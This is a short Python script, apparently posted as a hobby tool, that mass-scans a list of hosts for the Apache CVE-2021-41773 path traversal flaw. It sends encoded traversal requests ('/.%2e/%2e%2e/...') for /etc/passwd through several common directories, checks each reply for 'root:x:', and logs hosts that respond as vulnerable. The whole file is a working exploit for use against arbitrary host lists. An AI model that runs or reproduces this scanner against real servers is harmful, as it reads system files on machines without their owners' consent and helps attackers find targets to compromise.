# Mass check Apache CVE-2021-41773
# Just4Fun
# Coded by Justakazh


import sys
import requests
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("""
	APACHE
 _____ _   _ _____ 
/  __ \ | | |  ___|
| /  \/ | | | |__  
| |   | | | |  __| 
| \__/\ \_/ / |___ 
 \____/\___/\____/ -2021-41773

Coded By: Justakazh
FB: fb.com/justakazh

                    """)

def jan_Cok(target):
	s = requests.Session()
	req = requests.Request(method='GET' , url=url)
	prep = req.prepare()
	prep.url = target
	r = s.send(prep, verify=False)

	# detect by root on /etc/passwd 
	if "root:x:" in r.text:
		print("[*] Vuln -> "+target)
		# save result
		open("vuln.txt", "a").write(target+"\n")
	else:
		print("[!] Not_Vuln -> "+target)

try:
	data = []
	liss = [i.strip() for i in open(sys.argv[1], "r").readlines()]
	for i in liss:
		domain = i.replace("http://", "").replace("https://", "").replace("/", "")

		# You can add a new common directory here
		common_dir = ['/cgi_bin', '/assets', '/icons', '/uploads', '/img', '/image']

		# add a common list 
		for cd in common_dir:
			url = "http://"+i+cd+"/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
			data.append(url)


	x = Pool(int(sys.argv[2]))
	x.map(jan_Cok, data)
except:
	print("Usage : cve-2021-41773.py file_list Pool")